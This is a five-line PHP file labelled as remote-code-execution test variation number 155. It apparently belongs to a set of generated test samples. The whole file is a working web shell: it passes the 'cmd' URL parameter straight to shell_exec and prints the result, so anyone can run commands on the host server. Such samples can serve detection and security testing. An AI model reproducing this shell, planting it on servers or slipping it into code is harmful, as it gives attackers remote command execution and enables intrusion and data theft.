<?php
// RCE test variation #155
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>